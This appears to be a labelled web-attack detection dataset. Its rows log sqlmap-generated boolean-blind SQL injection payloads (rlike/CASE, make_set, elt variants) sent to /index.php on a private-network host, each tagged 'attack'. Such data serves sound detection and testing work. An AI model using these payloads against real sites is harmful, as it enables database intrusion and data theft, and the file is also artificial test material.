/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end))-- rdeg,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') rlike (select (case when (2007=5763) then 0x73646373 else 0x28 end)) and ('casr'='casr,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and (('ssly'='ssly,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ((('txlq'='txlq,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike (select (case when (6240=4034) then 0x73646373 else 0x28 end)) and 'cvbz'='cvbz,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and 'tsec'='tsec,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ('rcmp' like 'rcmp,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) rlike (select (case when (1889=4090) then 0x73646373 else 0x28 end)) and (('zdfy' like 'zdfy,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike (select (case when (5179=7370) then 0x73646373 else 0x28 end)) and ((('eare' like 'eare,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ((('wnct' like 'wnct,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and 'jlmm' like 'jlmm,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and (""lwab""=""lwab",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ((""yljq""=""yljq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" rlike (select (case when (7954=1059) then 0x73646373 else 0x28 end)) and ""thdb""=""thdb",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ""ceuc""=""ceuc",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ((""nwoa"" like ""nwoa",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" rlike (select (case when (9942=9742) then 0x73646373 else 0x28 end)) and ""gxxf"" like ""gxxf",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and (('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ((('%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' rlike (select (case when (7058=5126) then 0x73646373 else 0x28 end)) and '%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and '%'=',attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" rlike (select (case when (4679=2107) then 0x73646373 else 0x28 end)) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as bbkx where 5964=5964 rlike (select (case when (8585=5052) then 0x73646373 else 0x28 end))-- aymv,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as xttn where 1259=1259 rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end))-- uzqf,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) rlike (select (case when (1724=8767) then 0x73646373 else 0x28 end))#,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) rlike (select (case when (1919=4897) then 0x73646373 else 0x28 end))-- tspu,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end))-- wckc,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and (2968=2968,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) rlike (select (case when (4265=7758) then 0x73646373 else 0x28 end)) and ((7441=7441,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and ((8485=8485,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) rlike (select (case when (4420=7945) then 0x73646373 else 0x28 end)) and (((5697=5697,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end)) and (((2925=2925,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike (select (case when (4645=3075) then 0x73646373 else 0x28 end)),attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike (select (case when (5039=3154) then 0x73646373 else 0x28 end))-- syex,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs rlike (select (case when (4289=4585) then 0x73646373 else 0x28 end))# iilr,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as ujem where 3533=3533 rlike (select (case when (4896=6113) then 0x73646373 else 0x28 end))-- okrq,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as iyxt where 7148=7148 rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end))-- gslf,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 5900=5900 rlike (select (case when (1077=7840) then 0x73646373 else 0x28 end))-- rdta,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 3403=3403 rlike (select (case when (4706=4706) then 0x73646373 else 0x28 end))-- vmrr,attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and make_set(1400=6225,6225)-- fhao",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and make_set(9849=9849,4163)-- dskf",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and make_set(6360=6177,6177) and ('uwqv'='uwqv",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and make_set(9849=9849,4163) and ('smvr'='smvr",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) and make_set(1064=8434,8434) and (('ekuw'='ekuw",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'))) and make_set(6377=8956,8956) and ((('kqeo'='kqeo",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and make_set(2742=7556,7556) and 'ohjy'='ohjy",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and make_set(9849=9849,4163) and 'fiqz'='fiqz",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and make_set(3615=4196,4196) and ('alwg' like 'alwg",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and make_set(9849=9849,4163) and ('aymy' like 'aymy",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) and make_set(9849=9849,4163) and (('thsb' like 'thsb",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'))) and make_set(2066=4540,4540) and ((('nhrb' like 'nhrb",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and make_set(8306=3498,3498) and 'jzpk' like 'jzpk",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and make_set(9849=9849,4163) and 'jjxc' like 'jjxc",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and make_set(9849=9849,4163) and (""qgaj""=""qgaj",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and make_set(6282=5165,5165) and ((""jagh""=""jagh",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and make_set(9968=8320,8320) and (((""gtrj""=""gtrj",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and make_set(9394=8882,8882) and ""bzkr""=""bzkr",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and make_set(9849=9849,4163) and (""luyq"" like ""luyq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and make_set(9849=9849,4163) and ((""yxne"" like ""yxne",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%') and make_set(2016=3112,3112) and ('%'='",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%')) and make_set(2769=2374,2374) and (('%'='",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%'))) and make_set(6737=9780,9780) and ((('%'='",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%' and make_set(5983=5692,5692) and '%'='",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and make_set(8929=9586,9586) and (""%""=""",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') as htfu where 7652=7652 and make_set(9849=9849,4163)-- hnmq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' in boolean mode) and make_set(9849=9849,4163)#",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) and make_set(4426=4343,4343)-- ikwd",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) and make_set(1518=2978,2978) and (2074=2074",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs)) and make_set(8865=2138,2138) and ((3789=3789",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs))) and make_set(8769=8427,8427) and (((6874=6874",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and make_set(9849=9849,4163)",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and make_set(9849=9849,4163)# xjax",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) as bvhw where 4708=4708 and make_set(9849=9849,4163)-- rmfg",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and elt(1161=1161,2607)-- ctlx",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and elt(3080=3078,3078)-- jdwk",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) and elt(8079=5358,5358) and (('fwml'='fwml",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) and elt(1161=1161,2607) and (('iqwq'='iqwq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and elt(1161=1161,2607) and 'agbg'='agbg",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and elt(1161=1161,2607) and ('xapq' like 'xapq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'))) and elt(4285=6691,6691) and ((('octi' like 'octi",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and elt(8443=6067,6067) and 'guyu' like 'guyu",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and elt(1161=1161,2607) and 'qklq' like 'qklq",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and elt(1161=1161,2607) and (""zmhb""=""zmhb",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and elt(9217=3386,3386) and ((""jmxb""=""jmxb",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and elt(1161=1161,2607) and ((""ojya""=""ojya",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and elt(1161=1161,2607) and (((""icps""=""icps",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and elt(5880=1639,1639) and (""lson"" like ""lson",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and elt(1161=1161,2607) and (""hpbx"" like ""hpbx",attack
/index.php,None,"*/* gzip,deflate no-cache close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%') and elt(2918=1610,1610) and ('%'='",attack
